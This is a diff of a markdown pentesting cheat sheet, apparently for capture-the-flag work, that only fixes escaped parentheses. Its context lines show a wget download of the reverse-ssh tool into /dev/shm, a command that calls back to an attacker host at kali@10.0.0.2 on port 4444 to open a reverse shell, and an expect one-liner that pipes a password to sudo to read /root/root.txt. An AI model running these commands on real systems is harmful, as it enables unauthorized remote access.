@@ -52,7 +52,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 /dev/shm/reverse-ssh -v -l -p 4444
 ```
 
-* \(2a\) Linux target:
+* (2a) Linux target:
 
 ```bash
 # Drop it via your preferred way, e.g.
@@ -61,7 +61,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 /dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
 ```
 
-* \(2b\) Windows 10 target \(for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)\):
+* (2b) Windows 10 target (for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)):
 
 ```bash
 # Drop it via your preferred way, e.g.
@@ -87,4 +87,3 @@ If for some reason you cannot obtain a full TTY you **still can interact with pr
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
-
